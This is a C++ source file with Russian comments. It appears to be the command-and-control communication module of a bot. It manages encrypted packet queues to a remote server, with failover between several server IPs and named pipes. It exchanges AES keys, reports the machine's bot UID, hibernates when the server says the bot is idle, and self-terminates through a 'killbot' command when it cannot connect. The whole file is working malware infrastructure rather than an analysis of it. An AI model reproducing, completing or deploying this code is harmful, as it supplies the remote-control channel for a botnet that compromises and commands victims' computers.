#include "WndRec\manager.h"
#include "WndRec\sender.h"
#include "WndRec\tunnel.h"
#include "WndRec\stream.h"
#include "core\debug.h"
#include "core\abstract.h"

namespace WndRec 
{

const DWORD MaxTimeNoAction = 10 * 60 * 1000; //время бездействия, по истечению которого отключаемся от сервера
const DWORD TimeLivePackage = 5 * 60 * 1000; //время жизни пакета после приема
const int MaxPackageCount = 40000; //максимальное количество пакетов в исходящем списке списке
const int MaxFreePackage = 300; //максимальное количество свободных пакетов
//время в течении которого оборвалась связь, если после коннекта в течении 30с оборвалась связь,
//то делаем еще попытку, при это считаем количество попыток
const int MinTimeConnectBreak = 30000; 
//количество попыток, после которых коннектимся на другой указанный айпи
//т. е. если связь быстро пропадает, значит проблемы с коннектом на этот сервер или что-то
//с портом, поэтому будем коннектится на другой (алтернативный) сервер
const int MaxAttemptsConnect = 5;

static void InitList( ListPackage& list );
static void ReleaseList( ListPackage& list );
static DWORD WINAPI ManagerThread( LPVOID p );
static Package* ExtractPackage( ListPackage& list, Package* prev );
//извлечение пакета из списка по его id или cmd
static Package* ExtractPackage( ListPackage& list, uint id, int cmd );
static void AddLastPackage( ListPackage& list, Package* p );
static void AddFirstPackage( ListPackage& list, Package* p );
static void ReleasePackage( Package* p );
static bool SendPackage(ServerData* server);
//убирает пакеты которые долго лежат в списке
static void ReleasePackageTime( ListPackage& list, ListPackage& packageFree );
static void CloseServer(ServerData* server);
//добавляет пакет в список входящих
static bool AddInPackage( ServerData* server, int cmd, int id, void* data, int sz );
//bool inited = false; //true - если библиотека проинициализирована

ServerData servers[MaxServers];
int c_servers = 0;
CRITICAL_SECTION lockServers;
CRITICAL_SECTION lockConnect; //используется при заурытии соединения из стороннего потока, чтобы коннект не сразу произошел
uint maxID = 0; //id для пакетов

//инициализация менеджера сервера
ServerData* Init( int flags, const char* ip, int port, int downtime )
{
	CriticalSection::Init(lockServers);
	CriticalSection::Init(lockConnect);
	c_servers = 0;
	//смотри есть ли уже в работе сервер с таким же IP
	int numServer = -1;
	int numFree = -1; //номер свободного элемента для нового сервера
	CriticalSection::Enter(lockServers);
	//проверяем инициализирован ли сервер с указанными ip:port
	if( (flags & 2) == 0 )
		for( int i = 0; i < c_servers && numServer < 0; i++ )
			for( int j = 0; j < servers[i].c_ip; j++ )
				if( Str::Cmp( servers[i].ip[j].ip, ip ) == 0 && servers[i].ip[j].port == port )
				{
					numServer = i;
					break;
				}
	if( numServer < 0 ) //новый сервер
	{
		//ищем свободную ячейку для сервера
		for( int i = 0; i < c_servers; i++ )
			if( servers[i].c_ip == 0 )
			{
				numFree = i;
				break;
			}
		if( numFree < 0 && c_servers < MaxServers ) 
		{
			numFree = c_servers; //свободных нет, добавляем новую
			c_servers++;
		}
		if( numFree >= 0 )
		{
			servers[numFree].c_ip = 0;
			servers[numFree].currIP = 0;
			AddIPServer( &servers[numFree], ip, port );
		}
	}
	CriticalSection::Leave(lockServers);
	if( numServer >= 0 ) 
	{
		if( (flags & 1) == 0 && servers[numServer].stopManager == 3 ) //менеджер в режиме спячки и дана команда на подключение
			OutOfHibernation(&servers[numServer]);
		servers[numServer].downtime = downtime ? downtime * 60 * 1000 : MaxTimeNoAction;
		servers[numServer].flags = flags;
		return &servers[numServer];
	}
	numServer = numFree;
	ServerData* server = &servers[numServer];
	
	StringBuilderStack<64> uid;
	Abstract::GetUid(uid);
	server->buf = InitPacketBuf( (byte*)uid.c_str(), uid.Len() );

	server->stopManager = 0;
	if( flags & 1 ) //запуск в режиме спячки
		server->stopManager = 3;
//	server->scServer = 0;
	server->io.Init();

	InitList(server->packageIn);
	InitList(server->packageOut);
	InitList(server->packageFree);

	server->downtime = downtime ? downtime * 60 * 1000 : MaxTimeNoAction;
	server->flags = flags;
	server->timeConnect = 0;
	server->attemptsConnect = 0;
	server->sleep = 0;

	InitTunnels();
	InitStreams();
	RunThread( ManagerThread, server );

	DbgMsg( "init server %08x", (DWORD)server );

	return server;
}

DWORD AddIPServer( ServerData* server, const char* ip, int port )
{
	if( server == 0 || server->c_ip >= MaxIPOnServer || ip == 0 || ip[0] == 0 ) return FALSE;
	DbgMsg( "server %08x add ip %s:%d (c_ip=%d)", server, ip, port, server->c_ip );
	CriticalSection lock(lockServers);
	int i = 0;
	for( ; i < server->c_ip; i++ )
		if( Str::Cmp( server->ip[i].ip, ip ) == 0 && server->ip[i].port == port )
			break;
	if( i >= server->c_ip )
	{
		Str::Copy( server->ip[server->c_ip].ip, ip );
		server->ip[server->c_ip].port = port;
		server->c_ip++;
	}
	else
		DbgMsg( "server %s:%d is present", ip, port );
	return TRUE;
}

void Release( ServerData* server )
{
	if( server == 0 ) return;

	if( server->stopManager != 2 ) //если главный поток работает, то останавливаем его
	{
		server->stopManager = 1;
		int wait = 60 * 1000 / 100;
		while( server->stopManager == 1 && --wait ) Delay(100); 
		//если в течении минуты поток не завершил работу, значит завершаем насильно
		if( wait == 0 ) CloseServer(server);
	}
	
	ReleasePacketBuf(server->buf);
	server->buf = 0;
	ReleaseList(server->packageIn);
	ReleaseList(server->packageOut);
	ReleaseList(server->packageFree);
	server->c_ip = 0;

	//смотрим сколько еще живых серверов
	int lived = 0;
	CriticalSection lock(lockServers);
	for( int i = 0; i < c_servers; i++ )
		if( servers[i].c_ip > 0 )
			lived++;
	if( lived == 0 ) //живых серверов нет, освобождаем все ресурсы
	{
		c_servers = 0;
	}
}

bool Reconnect( ServerData* server, const char* ip, int port )
{
	if( !server ) return false;
	for( int i = 0; i < server->c_ip; i++ )
	{
		if( Str::Cmp( server->ip[i].ip, ip ) == 0 && server->ip[i].port == port )
		{
			CriticalSection::Enter(lockConnect);
			if( server->currIP != i ) CloseServer(server);
			server->currIP = i;
			server->timeConnect = 0;
			server->attemptsConnect = 0;
			CriticalSection::Leave(lockConnect);
			OutOfHibernation(server);
			return true;
		}
	}
	return false;
}

void UpdateSettings( ServerData* server, int setFlags, int resetFlags, int downtime )
{
	if( server == 0 ) return;
	server->flags |= setFlags; //устанавливаемые флаги
	server->flags &= ~resetFlags; //сбрасываем флаги
	if( downtime >= 0 )
		server->downtime = downtime ? downtime * 60 * 1000 : MaxTimeNoAction;
}

//отправляет команду с данными на сервер, возвращает идентификатор посланного пакета, если возращает 0,
//то ошибка отправки.
//Если пакет имеет размер более 4096 байт, то он делится на несколько пакетов, каждый не более 4096 байт,
//при этом для каждой части будет одна и таже команда
DWORD WriteData( ServerData* server, int cmd, const void* data, int c_data, int flags, uint id )
{
//	if( !inited || server == 0  ) return 0;
	Package* p = AllocPackage( server, c_data );
	if( p == 0 ) return 0;
	p->data.Copy( data, c_data );
	p->id = id;
	DWORD ret = WritePackage( server, cmd, p, flags );
	if( ret == 0 ) //если проблема со связью, то ложим пакет в список свободных
	{
		AddLastPackage( server->packageFree, p );
	}
	return ret;
}

void WaitSendedPackages( ServerData* server, int min, int wait )
{
	while( wait > 0 )
	{
		if( server->packageOut.count <= min ) break;
		Delay(100);
		wait -= 100;
	}
}

//читает данные по идентификатору возвращаенному функцией WriteData. Возвращает длину полученных данных.
//data - указатель на буфер куда будут ложится данные, szData - размер буфера, если szData < 0, то
//система сама выделяет нужное количество памяти и возвращает в data, в таких случаях нужно самим освобождать
//память.
//wait - количество милисекунд ожидания данных
//если возвращается 0, то ошибка чтения, если -1, то данных еще нет, нужно еще ждать
int ReadData( ServerData* server, DWORD id, int cmd, void** data, int szData, int wait )
{
	if( server == 0 ) return 0;
	int time = 0;
	while( time < wait )
	{
		Package* p = ExtractPackage( server->packageIn, id, cmd );
		if( p )
		{
			if( szData < 0 )
			{
				szData = p->data.Len();
				*data = Mem::Alloc(szData);
			}
			else
				if( szData > p->data.Len() )
					szData = p->data.Len();
			Mem::Copy( *data, p->data.Ptr(), szData );
			AddLastPackage( server->packageFree, p );
			return szData;
		}
//		if( server->scServer <= 0 ) return 0;
		if( !server->io.Connected() ) return 0;
		time += 10;
		Delay(10);
	}
	return -1;
}

int ReadData2( ServerData* server, DWORD id, int cmd, void* data, int szData, int wait )
{
	if( data && szData > 0 )
		return ReadData( server, id, cmd, &data, szData, wait );
	return 0;
}

//отсылает команду с данными и получает результат. Выполяет вызов WriteData() и ReadData()
int GetData( ServerData* server, int cmd, void* sendData, int c_sendData, void** recvData, int szRecvData, int flags, int wait )
{
	uint id = WriteData( server, cmd, sendData, c_sendData, flags );
	if( id == 0 ) return 0;
	return ReadData( server, id, 0, recvData, szRecvData, wait );
}

int GetData2( ServerData* server, int cmd, void* sendData, int c_sendData, void* recvData, int szRecvData, int flags, int wait )
{
	if( recvData && szRecvData > 0 )
		return GetData( server, cmd, sendData, c_sendData, &recvData, szRecvData, flags, wait );
	return 0;
}

int OutOfHibernation( ServerData* server, bool notWait )
{
//	if( !inited ) return 1; //не было инициализации
//	if( server->scServer > 0 ) return 0; //поток работает
	if( server->io.Connected() ) return 0; //поток работает
	if( server->stopManager == 3 ) //поток в режиме ожидания
	{
		server->stopManager = 0; //пробуждаем поток
		if( !notWait )
		{
			int wait = 10;
//			while( --wait && server->scServer <= 0 ) Delay(1000); //ждем когда сконектится
			while( --wait && !server->io.Connected() ) Delay(1000); //ждем когда сконектится
//			if( server->scServer <= 0 ) //не сконектился
			if( !server->io.Connected() ) //не сконектился
				return 3;
		}
		return 0;
	}
	return 2; //поток скорее всего не работает
}

DWORD WritePackage( ServerData* server, int cmd, Package* p, int flags )
{
	if( server->stopManager == 3 ) //в режиме спячки
	{
		//пробуждаем
		if( OutOfHibernation( server, true ) != 0 ) 
			return 0;
	}
//	if( server->scServer <= 0 && (flags & 2) ) return 0; 
	if( !server->io.Connected() && (flags & 2) ) return 0; 
	//если коннекта к серверу нет, то ждем его где-то минуту, и только потом ложим пакет
//	int wait = 60 * 1000 / 100;
//	while( server->scServer <= 0 && --wait ) Delay(100);
//	if( server->scServer <= 0 ) return 0;
	DbgMsg( "all packets %d", server->packageOut.count );
	while( server->packageOut.count >= MaxPackageCount ) 
	{
//		if( server->scServer <= 0 && (flags & 2) ) return 0;
		if( !server->io.Connected() && (flags & 2) ) return 0;
		Delay(10);
	}
	p->cmd = cmd;
	p->time = API(KERNEL32, GetTickCount)();
	p->flags = flags;
	if( flags & 4 ) //высокий приоритет, ложим в начало очереди, чтобы быстрее отправилось
		AddFirstPackage( server->packageOut, p );
	else
	{
		AddLastPackage( server->packageOut, p );
	}
	DbgMsg( "add package cmd %d, id %d, size %d", p->cmd, p->id, p->data.Len() );
	return p->id;
}

static bool ConnectToServer( ServerData* server )
{
	CriticalSection cs(lockConnect);
	for( int i = 0; i < server->c_ip; i++ )
	{
		DWORD time = API(KERNEL32, GetTickCount)();
		if( time - server->timeConnect < MinTimeConnectBreak ) //коннект долго не продержался
			server->attemptsConnect++;
		else
			server->attemptsConnect = 0;
		if( server->attemptsConnect >= MaxAttemptsConnect ) //много раз обрывалась связь
		{
			DbgMsg( "impossible normal connect to %s:%d, try another", server->ip[server->currIP].ip, server->ip[server->currIP].port );
			server->timeConnect = 0;
			server->attemptsConnect = 0;
		}
		else
		{
			DbgMsg( "try connect %s:%d", server->ip[server->currIP].ip, server->ip[server->currIP].port );
//			server->scServer = Socket::ConnectIP( server->ip[server->currIP].ip, server->ip[server->currIP].port );
			bool res;
			if( server->ip[server->currIP].port > 0 )
			{
//				if( server->ip[server->currIP].port == 443 )
//					res = server->io.ConnectHttps(server->ip[server->currIP].ip);
//				else
					res = server->io.ConnectIP( server->ip[server->currIP].ip, server->ip[server->currIP].port );
			}
			else
				res = server->io.ConnectPipe( server->ip[server->currIP].ip );
//			if( server->scServer <= 0 )
			if( !res )
				DbgMsg( "Not connect %s:%d", server->ip[server->currIP].ip, server->ip[server->currIP].port );
			else
			{
				DbgMsg( "Connected with %s:%d", server->ip[server->currIP].ip, server->ip[server->currIP].port );
				server->timeConnect = API(KERNEL32, GetTickCount)();
				//сообщаем что сервер соединился (cmdexec это поймает и отправит дальше)
				int connect = 1;
				AddInPackage( server, ID_CONNECTED, 0, &connect, sizeof(connect) );
				return true;
			}
		}
		server->currIP++;
		if( server->currIP >= server->c_ip ) server->currIP = 0;
	}
	return false;
}

//отключение от сервера
static void CloseServer(ServerData* server)
{
	DbgMsg( "break connection %08x", server );
//	Socket::Close(server->scServer);
	server->io.Close();
	bool connected = server->io.Connected();
	ResetBuf(server->buf);
//	if( server->scServer )
	if( connected )
	{
		int connect = 0;
		AddInPackage( server, ID_CONNECTED, 0, &connect, sizeof(connect) );
	}
//	server->scServer = 0;
	Delay(5000); //ждем секунд пять, чтобы клиенты (которым нужно) получили сигнал о пропаже связи
	//удаляем исходящие пакеты которые нельзя отправлять при разрыве связи
	CriticalSection::Enter(server->packageOut.lock);
	if( server->packageOut.last )
	{
		Package* prev = server->packageOut.last; 
		for(;;)
		{
			if( prev->next->flags & 1 )
			{
				Package* p = ExtractPackage( server->packageOut, prev );
				DbgMsg( "del package cmd %d, id %d", p->cmd, p->id );
				if( server->packageFree.count > MaxFreePackage ) //в списке свободных максимальное количество элементов
					ReleasePackage(p);
				else
					AddLastPackage( server->packageFree, p );
				if( server->packageOut.last == 0 ) break;
			}
			else
			{
				prev = prev->next;
				if( prev == server->packageOut.last ) break;
			}
		}
	}
	CriticalSection::Leave(server->packageOut.lock);
	if( server->flags & 4 ) //при пропаже связи сервер должен завершить работу
		server->stopManager = 1;
	server->buf->rsa = true;
	DbgMsg("break connection end");
}

//отсылает один пакет из списка, возвращает true, если есть еще пакеты на отправку, false - если нечего больше отсылать
static bool SendPackage(ServerData* server)
{
	bool ret = false;
	Package* p = 0;
	CriticalSection::Enter(server->packageOut.lock);
	if( server->packageOut.count > 0 )
	{
//		if( server->scServer > 0 )
		if( server->io.Connected() )
		{
			p = ExtractPackage( server->packageOut, server->packageOut.last ); //извлекаем 1-й пакет в списке
			if( server->packageOut.count > 0 ) ret = true;
		}
		else
			ret = true; //соединения нет, но есть еще пакеты
	}
	CriticalSection::Leave(server->packageOut.lock);
	if( p )
	{
		if( WritePacket( server->buf, p->cmd, server->io, p->data.Ptr(), p->data.Len(), p->id ) ) //если отправка успешная, то ложим пакет в список свободных
		{
			if( server->packageFree.count < MaxFreePackage )
				AddLastPackage( server->packageFree, p );
			else
				ReleasePackage(p);
		}
		else //если отправка неудачная, то скорее всего оборвалась связь
		{
			DbgMsg( "not send package cmd %d, id %d", p->cmd, p->id );
			AddFirstPackage( server->packageOut, p ); //ложим пакет обратно в начало списка
			CloseServer(server);
			ret = true;
		}
	}
	return ret;
}

//получаем пакет и ложим его в список входящих, возвращает true, если был считан пакет
static bool RecvPackage( ServerData* server, int wait )
{
//	if( server->scServer <= 0 ) return false;
	if( !server->io.Connected() ) return false;
	uint id;
	int cmd;
	char* data = (char*)-1;
	int sz = ReadPacket( server->buf, cmd, server->io, (void**)&data, wait, &id );
	if( sz > 0 )
	{
		return AddInPackage( server, cmd, id, data, sz );
	}
	else
		if( sz == 0 )
			CloseServer(server);
	return false;
}

static bool AddInPackage( ServerData* server, int cmd, int id, void* data, int sz )
{
	Package* p = AllocPackage( server, sz );
	if( p )
	{
		p->cmd = cmd;
		p->id = id;
		p->data.Copy( data, sz );
		p->time = API(KERNEL32, GetTickCount)();
		DbgMsg( "recv package cmd %d, id %d, len %d", p->cmd, p->id, p->data.Len() );
		AddLastPackage( server->packageIn, p );
		return true;
	}
	return false;
}

//главный управляющий поток, отправляющий и принимающий пакеты с сервера, 
//должен быть всегда один в одном процессе
static DWORD WINAPI ManagerThread( LPVOID p )
{
	ServerData* server = (ServerData*)p;
	StringBuilderStack<64> uid;
	Abstract::GetUid(uid);
	int attemptsCount = 0; //количество попыток соединиться
	for(;;)
	{
		DWORD timePing = API(KERNEL32, GetTickCount)(); //время для отправки пингов
		DWORD timeNoAction = timePing; //время бездействия
		DWORD timeLive = 0; //время жизни входящих пакетов
		int wait = 0; //время ожидания входного пакета
		while( server->stopManager == 0 )
		{
//			if( server->scServer <= 0 ) //нет соединения, пытаемся соединиться
			if( !server->io.Connected() ) //нет соединения, пытаемся соединиться
			{
				if( !ConnectToServer(server) ) //не удалось соединиться
				{
					attemptsCount++;
					if( attemptsCount > 20 && (server->flags & 8) ) //20 попыток коннекта, примерно 2 минуты
					{
						//отсылаем команду killbot
						byte data[9];
						data[0] = 7;
						data[1] = 0;
						data[2] = 'k'; data[3] = 'i'; data[4] = 'l'; data[5] = 'l'; data[6] = 'b'; data[7] = 'o'; data[8] = 't';
						AddInPackage( server, 27, 0, data, sizeof(data) );
						server->stopManager = 1;
						break;
					}
					Delay(5000); //ждем 5 секунд
					continue;
				}
				attemptsCount = 0;
				//шлем серверу маску и уид бота 
				GenAES256Key(server->buf->aesKey);
				server->buf->rsa = true;
				if( !WritePacket( server->buf, ID_XOR_MASK, server->io, server->buf->aesKey.Ptr(), server->buf->aesKey.Len() ) ) 
				{
					CloseServer(server); //при неудаче будем снова пытаться соединиться
					continue; 
				}
				server->buf->rsa = false;
				if( !WritePacket( server->buf, ID_SET_UID2, server->io, uid, uid.Len() ) ) 
				{
					CloseServer(server); //при неудаче будем снова пытаться соединиться
					continue; 
				}
			}
			DWORD currTime = API(KERNEL32, GetTickCount)();

			if( server->packageOut.count > 0 )
			{
				timePing = currTime;
				timeNoAction = currTime;
			}
			if( server->packageIn.count > 0 )
				timeNoAction = currTime;

			if( server->packageOut.count > 0 )
				wait = 1;
			else
			{
				wait += 100;
				if( wait > 1000 ) wait = 1000;
			}
			RecvPackage( server, wait );
			//за время ожидания мог появиться пакет, поэтому уменьшаем время ожидания
			if( server->packageOut.count > 0 ) wait = 1;
			SendPackage(server);

			if( currTime - timePing > 5000 ) //5 секунд бездействия, шлем пинг
			{
				timePing = currTime;
//				if( server->scServer > 0 )
				if( server->io.Connected() )
				{
					if( !WritePacket( server->buf, ID_PING, server->io, 0, 0 ) ) //отсылаем пинг
					{
						CloseServer(server);
						continue;
					}
				}
			}
			if( currTime - timeLive > 60 * 1000 ) //каждую минуту удаляем пакеты, лежащие слишком долго в списке
			{
				timeLive = currTime;
				ReleasePackageTime( server->packageIn, server->packageFree );
			}
			//если долго сидим без работы, то спросим у сервера можно ли отключиться и перейти в режим спячки
			if( currTime - timeNoAction > server->downtime ) 
			{
				timeNoAction = currTime;
				int res = -1;
				if( WritePacket( server->buf, ID_BOT_WORK, server->io, 0, 0 ) )
				{
					int cmd = 0;
					char* data = (char*)-1;
					int sz = ReadPacket( server->buf, cmd, server->io, (void**)&data );
					if( sz > 0 ) res = data[0];
				}
				if( res < 0 ) //оборвался коннект
					CloseServer(server);
				else
					if( res == 0 ) //бот ничем не занят
						server->stopManager = 3; //режим спячки
			}
		}
		DbgMsg( "stopManager %d", server->stopManager );
		//отправляем и принимаем все пакеты
//		while( server->scServer > 0 )
		while( server->io.Connected() )
			if( !SendPackage(server) && !RecvPackage( server, 1 ) )
				break;
		CloseServer(server);
		if( server->stopManager == 1 ) //команда на завершение работы потока
		{
			server->stopManager = 2;
			break;
		}
		else
			//находимся в режиме спячки, пока не поступит команда на подключение или на передачу данных
			if( server->stopManager == 3 ) 
			{
				DbgMsg( "stopManager 3, waiting %ds", server->sleep );
				int sleep = 0;
				while( server->stopManager == 3 ) 
				{
					Delay(1000);
					sleep++;
					if( server->sleep > 0 && server->sleep <= sleep )
					{
						server->stopManager = 0;
						DbgMsg( "Вышли из спячки" );
						break;
					}
				}
				if( server->stopManager != 0 ) //по какой-то причине вышли из режима ожидания
				{
					server->stopManager = 2;
					break;
				}
				DbgMsg( "run working!!!" );
			}
			else
				if( server->stopManager != 0 ) //за время перехода в спячку, может появится пакет, значит нужно просыпаться
					break;
	}
	Delay(10 * 1000); //ждем пока завершатся все процессы
	Release(server); //если сервер был остановлен не через Release, то нужно освободить ресурсы (повторный вызов Release не создает проблем)
	return 0;
}

static void InitList( ListPackage& list )
{
	list.last = 0;
	list.count = 0;
	CriticalSection::Init(list.lock);
}

static void ReleaseList( ListPackage& list )
{
	CriticalSection lock(list.lock);
	while( list.last )
	{
		Package* p = ExtractPackage( list, list.last );
		ReleasePackage(p);
	}
}

//добавление пакета в конец списка
static void AddLastPackage( ListPackage& list, Package* p )
{
	CriticalSection lock(list.lock);
	if( list.last )
	{
		p->next = list.last->next;
		list.last->next = p;
	}
	else 
		p->next = p;
	list.last = p;
	if( p->id == 0 ) p->id = ++maxID;
	list.count++;
}

//добавление пакета в начало списка списка
static void AddFirstPackage( ListPackage& list, Package* p )
{
	CriticalSection lock(list.lock);
	if( list.last )
	{
		p->next = list.last->next;
		list.last->next = p;
	}
	else 
	{
		p->next = p;
		list.last = p;
	}
	if( p->id == 0 ) p->id = ++maxID;
	list.count++;
}

//удаляет из списка пакет следующий за prev, возвращает указатель на извлеченный пакет
static Package* ExtractPackage( ListPackage& list, Package* prev )
{
	Package* curr = prev->next;
	if( prev == curr ) //в списке один пакет
		list.last = 0;
	else
	{
		prev->next = curr->next;
		if( list.last == curr ) //извлекается последний элемент в списке
			list.last = prev;
	}
	list.count--;
	return curr;
}

//извлечение пакета из списка по его id или cmd
static Package* ExtractPackage( ListPackage& list, uint id, int cmd )
{
	Package* finded = 0;
	CriticalSection lock(list.lock);
	if( list.last )
	{
		//вначале ищем пакет
		Package* prev = list.last; //для удаления из списка ищем предыдущий пакет
		do
		{
			if( (id && prev->next->id == id) || (cmd && prev->next->cmd == cmd) )
			{
				finded = prev->next;
				break;
			}
			prev = prev->next;
		} while( prev != list.last );
		if( finded )
			ExtractPackage( list, prev );
	}
	return finded;
}

//выделяет пакет нужного размера
Package* AllocPackage( ServerData* server, int sz )
{
	Package* finded = 0;
	CriticalSection::Enter( server->packageFree.lock );
	if( server->packageFree.last )
	{
		Package* prev = server->packageFree.last;
		do
		{
			if( prev->next->data.Size() >= sz )
			{
				finded = prev->next;
				break;
			}
		} while( prev != server->packageFree.last );
		if( finded )
			ExtractPackage( server->packageFree, prev );
		else //если нужного размера пакета нет, то берем 1-й и потом перевыделяем в нем память до нужного размера
			finded = ExtractPackage( server->packageFree, server->packageFree.last );
	}
	CriticalSection::Leave( server->packageFree.lock );
	if( finded )
	{
		if( finded->data.Size() < sz ) //в пакете недостаточно памяти, перевыделяем
		{
			if( !finded->data.MakeEnough(sz) )
			{
				ReleasePackage(finded);
				finded = 0;
			}
		}
	}
	else //список еще пустой, создаем новый пакет
	{
		finded = new Package();
		if( finded )
		{
			sz = MinSizePackage > sz ? MinSizePackage : sz;
			if( !finded->data.MakeEnough(sz) )
			{
				ReleasePackage(finded);
				finded = 0;
			}
		}
	}
	if( finded ) //инициализация пакета
	{
		finded->data.SetLen(0);
		finded->id = 0;
	}
	return finded;
}

static void ReleasePackage( Package* p )
{
	delete p;
}

//убирает пакеты которые долго лежат в списке
static void ReleasePackageTime( ListPackage& list, ListPackage& packageFree )
{
	DWORD time = API(KERNEL32, GetTickCount)();
	CriticalSection lock(list.lock);
	if( list.last )
	{
		Package* prev = list.last; 
		for(;;)
		{
			if( time - prev->next->time > TimeLivePackage )
			{
				Package* p = ExtractPackage( list, prev );
				if( packageFree.count > MaxFreePackage ) //в списке свободных максимальное количество элементов
					ReleasePackage(p);
				else
					AddLastPackage( packageFree, p );
				DbgMsg( "del in package cmd %d, id %d, size %d", p->cmd, p->id, p->data.Len() );
				if( list.last == 0 ) break;
			}
			else
			{
				prev = prev->next;
				if( prev == list.last ) break;
			}
		}
	}
}

const char* GetIPServer(ServerData* server)
{
	return server->ip[server->currIP].ip;
}

int GetPortServer(ServerData* server)
{
	return server->ip[server->currIP].port;
}

int ReadCmd( ServerData* server, int& cmd, uint& id, const int cmds[][2], Mem::Data& data, int wait )
{
	int time = 0;
	while( time <= wait )
	{
		Package* finded = 0;
		CriticalSection::Enter(server->packageIn.lock);
		if( server->packageIn.last )
		{
			//в начале ищем пакет
			Package* prev = server->packageIn.last; //для удаления из списка ищем предыдущий пакет
			do
			{
				int i = 0;
				while( cmds[i][0] )
					if( cmds[i][0] <= prev->next->cmd && prev->next->cmd <= cmds[i][1] )
					{
						finded = prev->next;
						ExtractPackage( server->packageIn, prev );
						break;
					}
					else
						i++;
				if( finded ) break;
				prev = prev->next;
			} while( prev != server->packageIn.last );
		}
		CriticalSection::Leave(server->packageIn.lock);
		if( finded )
		{
			cmd = finded->cmd;
			data.Copy(finded->data);
			AddLastPackage( server->packageFree, finded );
			id = finded->id;
			return data.Len();
		}
//		if( server->scServer <= 0 ) return 0;
		if( !server->io.Connected() ) return 0;
		time += 10;
		if( time > wait ) break;
		Delay(10);
	}
	return -1;
}

//войти в режим спячки
void RunHibernation( ServerData* server, int time )
{
	server->stopManager = 3;
	server->sleep = time;
}

//ждет пока пакет id не отправится
bool WaitOutPackage( ServerData* server, DWORD id, int wait )
{
	int time = 0;
	bool ret = false;
	DbgMsg( "wait send package %d", id );
	while( time < wait && !ret )
	{
		ListPackage& list = server->packageOut;
		ret = true;
		CriticalSection::Enter(list.lock);
		if( list.last )
		{
			Package* prev = list.last; 
			do
			{
				if( prev->next->id == id ) //пакет еще в очереди
				{
					ret = false;
					break;
				}
				prev = prev->next;
			} while( prev != list.last );
		}
		CriticalSection::Leave(list.lock);
		Delay(100);
	}
	DbgMsg( "package %d sended", id );
	return ret;
}

ServerData* DuplicationServer( ServerData* server, int id )
{
	ServerData* server2 = (ServerData*)Init( 2 + 4, server->ip[server->currIP].ip, server->ip[server->currIP].port, 24 * 60 * 60 * 1000 );
	return server2;
}

DWORD SendStr( ServerData* server, int id, int subId, const char* s, int c_s )
{
	if( server == 0 ) return 0;
	if( c_s < 0 ) c_s = Str::Len(s);
	int sz = sizeof(WndRec::StrServer) + c_s + 1;
	Package* p = AllocPackage( server, sz );
	if( p == 0 ) return 0;
	WndRec::StrServer* s2 = (WndRec::StrServer*)p->data.Ptr();
	s2->id = id;
	s2->subId = subId;
	s2->c_s = c_s;
	Mem::Copy( s2->s, s, c_s );
	s2->s[c_s] = 0;
	p->data.SetLen(sz);
	return WritePackage( server, ID_SENDSTR, p );
}


}
